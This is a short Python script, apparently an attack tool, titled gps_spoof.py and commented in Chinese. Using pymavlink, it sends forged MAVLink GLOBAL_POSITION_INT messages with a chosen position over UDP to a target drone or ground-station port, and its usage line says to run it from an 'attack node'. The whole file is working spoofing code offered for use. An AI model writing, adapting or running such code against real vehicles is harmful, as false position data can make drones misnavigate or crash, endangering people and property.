#!/usr/bin/env python3
# gps_spoof.py
# 用法（在攻击节点上运行）:
# python3 gps_spoof.py --target 10.0.0.4 --port 14560 --lat 22.5 --lon 114.1 --alt 100 --rate 1 --duration 60

import argparse
import time
from pymavlink import mavutil

def send_fake_gps(target_ip, target_port, lat, lon, alt, rate_hz, duration):
    # 建立 UDP 连接到目标 MAVLink 端口
    mav = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=250)
    t0 = time.time()
    seq = 0
    while time.time() - t0 < duration:
        # 构造 GLOBAL_POSITION_INT（位置信息以 deg * 1e7, alt in mm）
        lat_i = int(lat * 1e7)
        lon_i = int(lon * 1e7)
        alt_mm = int(alt * 1000)
        # time_boot_ms (use ms)
        time_boot_ms = int((time.time() - t0) * 1000) & 0xffffffff
        # 使用 MAVLink v1/2: GLOBAL_POSITION_INT: time_boot_ms, lat, lon, alt, relative_alt, vx, vy, vz, hdg
        mav.mav.global_position_int_send(time_boot_ms, lat_i, lon_i, alt_mm, alt_mm, 0, 0, 0, 65535)
        seq += 1
        time.sleep(1.0 / rate_hz)
    mav.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--lat", type=float, required=True)
    parser.add_argument("--lon", type=float, required=True)
    parser.add_argument("--alt", type=float, default=100.0)
    parser.add_argument("--rate", type=float, default=1.0)
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()
    print(f"[GPS_SPOOF] -> {args.target}:{args.port}, lat={args.lat},lon={args.lon},alt={args.alt},dur={args.duration}s")
    send_fake_gps(args.target, args.port, args.lat, args.lon, args.alt, args.rate, args.duration)
    print("[GPS_SPOOF] done")

